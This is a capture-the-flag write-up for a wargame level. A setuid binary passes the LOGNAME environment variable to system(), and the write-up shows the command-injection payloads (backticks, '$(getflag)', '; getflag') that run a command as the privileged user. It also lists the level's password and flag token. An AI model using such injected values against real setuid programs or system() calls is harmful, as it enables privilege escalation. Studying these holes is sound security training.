# level07

A setuid binary that greets you by name, except it reads your name from an environment variable and then hands it to a shell. Never trust the environment, it's basically all attacker-controlled :)

| | |
| --- | --- |
| **Login** | `level07` / `wiok45aaoguiboiki2tuin6ub` (the flag06 token) |
| **flag07 password** | n/a (setuid binary runs our command as flag07) |
| **flag07 token** | `fiumuikeil55xe9cu4dood66h` (aka the level08 password) |

## poking around

One setuid binary in home, no source this time:

```bash
$ ls -l ~/level07
-rwsr-sr-x 1 flag07 level07 8805 ... level07
```

`strings` tells the whole story without even opening a disassembler:

```
getenv
LOGNAME
/bin/echo %s
system
```

Reading between those four lines: it does `getenv("LOGNAME")`, builds the string `/bin/echo <LOGNAME>`, and runs it with `system()`. In IDA it's the expected `sprintf(buf, "/bin/echo %s ", getenv("LOGNAME"))` followed by `system(buf)`.

## the hole

`LOGNAME` is just an environment variable, and we set the environment. `system()` runs the whole string through `/bin/sh -c`, so if `LOGNAME` contains shell metacharacters, they get interpreted. The program thinks it's echoing a username; the shell sees a second command.

Set `LOGNAME` to a command substitution and it runs as flag07:

```bash
$ LOGNAME='`getflag`' ~/level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

The backticks run `getflag` first (as flag07), and `/bin/echo` dutifully prints its output. `; getflag` or `$(getflag)` work just as well, they all break out of the intended `echo` the same way.
